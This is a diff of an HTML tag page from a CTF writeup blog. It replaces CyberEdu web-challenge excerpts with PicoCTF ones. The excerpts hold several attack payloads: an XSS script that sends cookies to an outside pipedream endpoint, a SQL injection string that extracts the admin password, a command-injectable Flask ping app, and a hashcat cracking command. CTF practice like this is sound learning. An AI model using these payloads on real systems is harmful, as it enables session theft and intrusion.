@@ -10,7 +10,7 @@
 <meta name="description" content="">
 <meta name="author" content="">
 <link rel="canonical" href="https://irinasusca.github.io/writeup-blog/tags/web/">
-<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.0104eb9d8f72dfc23e72924f1f282ad928b9467519160af39d6ea2ca5ea692a4.css" integrity="sha256-AQTrnY9y38I&#43;cpJPHygq2Si5RnUZFgrznW6iyl6mkqQ=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
@@ -85,7 +85,9 @@
     <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">
+                <img src="/writeup-blog/images/sakura.png" alt="" aria-label="logo"
+                     style="vertical-align:middle; margin-right:8px; display:inline-block;">Irina&#39;s CTF Writeups</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -135,133 +137,176 @@
   </h1>
 </header>
 
-<article class="post-entry tag-entry"> 
+
+
+<article class="post-entry tag-entry"
+  data-tags="picoctf web "> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu downloader-v1 Writeup
+    <h2 class="entry-hint-parent">Pico Secret Box writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Don’t you find it frustrating when you have uploaded some files on a website but you’re are not sure if the download button works? Me neither. But some people did. Is there even demand for such a service?
-Identifying the vulnerabilities In the GET request, we have a comment pointing us to flag.php, and the /file.php contains “GET ME”. Using gobuster, we find a /uploads/ directory. There’s a /uploads/index.html, but it’s empty. I kept trying to find a way to access uploads aimlessly, when I thought, what if I try to send an actual image’s link?
+    <p>Overview I’ve set up geo-based routing - can you outsmart it? You’re trying to retrieve the flag, but there’s a catch: access to the real service is restricted based on your geographic location. Only requests from a specific region are routed to the server that holds the flag. Everyone else is sent somewhere… less interesting.
+Identifying the vulnerabilities The create secret is vulnerable to sql injection; Creating a secret with the contents a&#39;); INSERT INTO secrets(owner_id, content) SELECT &#39;5fba75e8-3444-434d-a353-b9ea93796097&#39;, password FROM users WHERE username = &#39;admin&#39;-- will insert into our secrets the admin’s password.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-12 00:00:00 +0000 UTC'>January 12, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu downloader-v1 Writeup" href="https://irinasusca.github.io/writeup-blog/posts/downloaderv1-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-04-20 00:00:00 +0000 UTC'>April 20, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to Pico Secret Box writeup" href="https://irinasusca.github.io/writeup-blog/posts/secretbox-writeup/"></a>
 </article>
 
-<article class="post-entry tag-entry"> 
+<article class="post-entry tag-entry"
+  data-tags="picoctf web "> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu manual-review Writeup
+    <h2 class="entry-hint-parent">Pico Crack The Gate 2 writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview For any coffe machine issue please open a ticket at the IT support department.
-Flag format: ctf{sha256}
-Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
-Identifying the vulnerabilities This look familiar?
-Alright, so XSS is confirmed, and we have two types of cookies.
-First, the CSRF protection tokens, XSTF-TOKEN, then the manual_review_session, which actually stores the current session/user.
-I sent a &lt;script&gt; fetch(&#39;https://myprivatelinkwithlimitedrequests.m.pipedream.net/?cookie=&#39; &#43; encodeURIComponent(document.cookie)); &lt;/script&gt; and look at what we got -
+    <p>Overview The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We’ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@picoctf.org and uncover the hidden secret.
+Identifying the vulnerabilities The challenge hints at modifying our headers, and the X-Forwarded-For header was the one responsible for rate limiting. We got a passwords.txt file, it wasn’t that long, but I wanted to practice python anyways; since I always dread doing it, I’m trying to force myself to get comfortable with it.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-12 00:00:00 +0000 UTC'>January 12, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu manual-review Writeup" href="https://irinasusca.github.io/writeup-blog/posts/manualreview-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-04-16 00:00:00 +0000 UTC'>April 16, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to Pico Crack The Gate 2 writeup" href="https://irinasusca.github.io/writeup-blog/posts/crackthegate-writeup/"></a>
 </article>
 
-<article class="post-entry tag-entry"> 
+<article class="post-entry tag-entry"
+  data-tags="picoctf web "> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu broken-login Writeup
+    <h2 class="entry-hint-parent">Pico Sql Map 1 writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Intern season is up again and our new intern Alex had to do a simple login page. Not only the login page is not working properly, it is also highly insecure…
-Identifying the vulnerabilities This is how our POST requests are sent.
-Then, another GET is made: GET /auth?username=67616761&amp;password=9748ae63d43e39bb35e3060fbde9f34c731d4173f8b579441404bed6f485644335fca004f512c6602f77549e0aa5e23fec9a8b3979d61a73b9eb414ee9a27ca6.
-That’s a sha512 hash. I’m thinking, why don’t we try rockyou.txt? We can just sha512 each entry, send it, and see if we get a response with a content length higher than 0. That failed though.
+    <p>Overview You’ve been hired by a shadowy group of pentesters who love a good puzzle. The system looks ordinary, but appearances lie. Somewhere inside, sloppy code and legacy hashing practices left a tiny….
+I finally stumbled upon the newer AI slop challenges from pico, presenting itself immediately through the page long description.
+Identifying the vulnerabilities We can register our own user and search for flags. Just writing Flag immediately shows a bunch of fake results; I tried running sqlmap as suggested by the challenge name, but it kept breaking, so I got annoyed and wrote my stuff manually.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu broken-login Writeup" href="https://irinasusca.github.io/writeup-blog/posts/brokenlogin-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-04-16 00:00:00 +0000 UTC'>April 16, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to Pico Sql Map 1 writeup" href="https://irinasusca.github.io/writeup-blog/posts/sqlmap-writeup/"></a>
 </article>
 
-<article class="post-entry tag-entry"> 
+<article class="post-entry tag-entry"
+  data-tags="picoctf web "> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu file-crawler Writeup
+    <h2 class="entry-hint-parent">Pico findme writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>I was stuck between starting to study heap properly or keep doing web challenges, and I guess here we are.
-Challenge overview Find the vulnerability and get the flag. The flag is located in a temporary folder.
-Identifying the vulnerabilities I inspected the original GET request with burp:
-Since the flag is located in a “temporary folder”, my first guess was /tmp/flag. I tried /local, and we get a TRY HARDER message.
+    <p>Overview Help us test the form by submiting the username as test and password as test!
+This only got a writeup because it took me almost half an hour.
+Identifying the vulnerabilities Logging in doesn’t do much, however by fuzzing we find a /home page, saying I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-). It also has a Search for flags search bar that does nothing. Parameter fuzzing didn’t work either.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu file-crawler Writeup" href="https://irinasusca.github.io/writeup-blog/posts/filecrawler-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-04-15 00:00:00 +0000 UTC'>April 15, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to Pico findme writeup" href="https://irinasusca.github.io/writeup-blog/posts/findme-writeup/"></a>
 </article>
 
-<article class="post-entry tag-entry"> 
+<article class="post-entry tag-entry"
+  data-tags="picoctf web "> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu ping-station Writeup
+    <h2 class="entry-hint-parent">Pico Trickster writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview Just another ping service to audit.
-We get an app(1).py file to look at.
-from flask import Flask, render_template, url_for, request, redirect import subprocess import re import string app = Flask(__name__) def is_valid_ip(ip): ipv = re.match(r&#34;^(\d{1,3})\.(\d{1,3})\.(\S{1,9})|(/s)\.(\d{1,3})$&#34;,ip) return bool(ipv) @app.route(&#39;/&#39;, methods=[&#39;POST&#39;, &#39;GET&#39;]) def index(): if request.method == &#39;POST&#39;: ip = request.form[&#39;content&#39;] if (is_valid_ip(ip)==True): for i in range(0,2): return &#39;&lt;pre&gt;&#39;&#43;subprocess.check_output(&#34;ping -c 4 &#34;&#43;ip,shell=True).decode()&#43;&#39;&lt;/pre&gt;&#39; break else: return&#34;That&#39;s not a valid IP&#34; else: return render_template(&#39;index.html&#39;) if __name__ == &#34;__main__&#34;: app.run(host = &#34;0.0.0.0&#34;) Identifying the vulnerabilities Looking at that &#34;ping -c 4 &#34;&#43;ip,shell=True), if we manage to smuggle a command past this is_valid_ip function, it will get executed.
+    <p>Overview I found a web app that can help process images: PNG images only!
+Image upload, so immediately this is some sort of php file upload vulnerability.
+Identifying the vulnerabilities We can smuggle any file as a png, by adding the PNG header and the .png extension, upon testing.
+There is also an /uploads directory, where we can find each one of our uploaded files.
+I noticed something interesting in the phrasing, when trying different exentions: Error: File name does not contain ‘.png’. So I thought, what if we just pop that in? So I send this file:
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-10 00:00:00 +0000 UTC'>January 10, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu ping-station Writeup" href="https://irinasusca.github.io/writeup-blog/posts/pingstation-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-04-15 00:00:00 +0000 UTC'>April 15, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to Pico Trickster writeup" href="https://irinasusca.github.io/writeup-blog/posts/trickster-writeup/"></a>
 </article>
 
-<article class="post-entry tag-entry"> 
+<article class="post-entry tag-entry"
+  data-tags="picoctf web "> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu jargon Writeup
+    <h2 class="entry-hint-parent">Pico JAuth writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview This ticketing platform looks like it was built back in the late ’90s, yet somehow it’s still running in 2025. Many of the flaws it carries are relics of an older era of the web. The question is: can you still exploit these outdated systems today, or has old-school web exploitation become harder in the modern landscape?
-Identifying the vulnerabilities We can look at /tickets?user=admin by clicking tickets. Here we’re given some hints:
+    <p>Overview Most web application developers use third party components without testing their security. Some of the past affected companies are:
+Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638 Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used VerticalScope (internet media company) - outdated version of vBulletin forum software used Can you identify the components and exploit the vulnerable one? The website is running here. Can you become an admin? You can login as test with the password Test123! to get started.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-09 00:00:00 +0000 UTC'>January 9, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu jargon Writeup" href="https://irinasusca.github.io/writeup-blog/posts/jargon-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-04-14 00:00:00 +0000 UTC'>April 14, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to Pico JAuth writeup" href="https://irinasusca.github.io/writeup-blog/posts/jauth-writeup/"></a>
 </article>
 
-<article class="post-entry tag-entry"> 
+<article class="post-entry tag-entry"
+  data-tags="picoctf web "> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">Serialization and Deserialization
+    <h2 class="entry-hint-parent">Pico Super Serial writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Why I decided to get more into this subject because of the challenge jargon. I was struggling with AIs and it was really getting on my nerves, because I felt I didn’t really understand what was going on. So I decided to write a little article about this, to make myself fully grasp serialization, deserialization and the subset of vulnerabilities that may come with them. So, let’s get into it.
+    <p>Overview Try to recover the flag stored on this website
+We have a login page, which upon trying any credentials, we get back the error Fatal error: Uncaught Exception: Unable to open database: unable to open database file in /var/www/html/index.php:5 Stack trace: #0 /var/www/html/index.php(5): SQLite3-&gt;__construct(&#39;../users.db&#39;) #1 {main} thrown in /var/www/html/index.php on line 5.
+Identifying the vulnerabilities I tried fuzzing, and we got some interesting pages:
+The authentication.php one would just redirect to index and clear our cookies, the cookie.php one was just empty, and set us a PHP session id, and in robots.txt was Disallow: /admin.phps, a file which did not exist.
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-08 00:00:00 +0000 UTC'>January 8, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to Serialization and Deserialization" href="https://irinasusca.github.io/writeup-blog/posts/serialization/"></a>
+  <footer class="entry-footer"><span title='2026-04-14 00:00:00 +0000 UTC'>April 14, 2026</span>&nbsp;·&nbsp;<span>3 min</span></footer>
+  <a class="entry-link" aria-label="post link to Pico Super Serial writeup" href="https://irinasusca.github.io/writeup-blog/posts/superserial-writeup/"></a>
 </article>
 
-<article class="post-entry tag-entry"> 
+<article class="post-entry tag-entry"
+  data-tags="picoctf web "> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">CyberEdu reccon Writeup
+    <h2 class="entry-hint-parent">Pico No FA writeup
     </h2>
   </header>
   <div class="entry-content">
-    <p>Challenge overview I heard you like memes, so we had a surprise for you. Enjoy !!
-Today is a big day. Finally solving a non-pwn challenge! Let’s see if I can still remember how burpsuite works.
-Identifying the vulnerabilities First I ran ffuf -u http://34.159.240.221:31548/FUZZ -w /usr/share/wordlists/dirb/common.txt, but only found .hta, .htaccess, .htpasswd and index.php.
-This is all. I ffufed for /images_FUZZ too, but nothing.
-I did exiftool, strings, looked at it in hex, steghide, stegseek, just about everything.
+    <p>Overview Seems like some data has been leaked! Can you get the flag?
+We’re given a website, its source and a db leak.
+Identifying the vulnerabilities The hashes aren’t salted at all, and just a sha256, so we can quickly crack the admin’s password with hashcat: hashcat -a 0 -m 1400 hashadmin.txt /usr/share/wordlists/rockyou.txt (-a 0 means dictionary attack, and -m 1400 means sha256).
+Then, looking at the source, for the admin user there is also a ‘MFA’ code, which has a 120 second duration, and is a random number from 1000 to 9999. I tried just sending the requests one by one, but it was taking forever, so I tried threads with ThreadPoolExecutor. This was my script:
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-07 00:00:00 +0000 UTC'>January 7, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to CyberEdu reccon Writeup" href="https://irinasusca.github.io/writeup-blog/posts/reccon-writeup/"></a>
+  <footer class="entry-footer"><span title='2026-04-09 00:00:00 +0000 UTC'>April 9, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to Pico No FA writeup" href="https://irinasusca.github.io/writeup-blog/posts/nofa-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"
+  data-tags="picoctf web "> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Pico Cookies &amp; More Cookies &amp; Most Cookies writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Cookies I’m making a writeup for this because I remember having tried to do this one unsuccessfully a while ago.
+When first logging in, in the request we can see a Cookie: name=-1 being set. Modifying it to name=1 for example doesn’t do much, except getting a That is a cookie! Not very special though… response.
+Setting it to admin just renders the default home page.
+There are two POST pages, /check and /search. The only time I saw /check get requested was when my search input was ‘chocolate chip’; that’s when the cookie was set to 1 by their side. Then I noticed ‘snickerdoodle’ was setting the Cookie to 0.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-04-03 00:00:00 +0000 UTC'>April 3, 2026</span>&nbsp;·&nbsp;<span>3 min</span></footer>
+  <a class="entry-link" aria-label="post link to Pico Cookies & More Cookies & Most Cookies writeup" href="https://irinasusca.github.io/writeup-blog/posts/picocookies-writeup/"></a>
+</article>
+
+<article class="post-entry tag-entry"
+  data-tags="picoctf web "> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Pico Some Assembly Required 1, 2, 3, 4 Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Some Assembly Required 1 Looking at ./G82XCw5CX3.js, we can see some strange wasm file getting imported, ./JIFxzHyW8W. I navigated to the directory and it immediately got downloaded.
+Note - just running strings on the file was fine too, I realised a little later, there wasn’t necessarily any need to decompile the wasm.
+I decompiled it with Ghidra (more on that in this post I made).
+We can see in the check_flag function it’s getting checked against the memory at 0x400, which just so happens to be the flag.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-04-02 00:00:00 +0000 UTC'>April 2, 2026</span>&nbsp;·&nbsp;<span>3 min</span></footer>
+  <a class="entry-link" aria-label="post link to Pico Some Assembly Required 1, 2, 3, 4 Writeup" href="https://irinasusca.github.io/writeup-blog/posts/someassemblyrequired-writeup/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
     <a class="prev" href="https://irinasusca.github.io/writeup-blog/tags/web/">
       «&nbsp;Prev&nbsp;
+    </a>
+    <a class="next" href="https://irinasusca.github.io/writeup-blog/tags/web/page/3/">Next&nbsp;&nbsp;»
     </a>
   </nav>
 </footer>
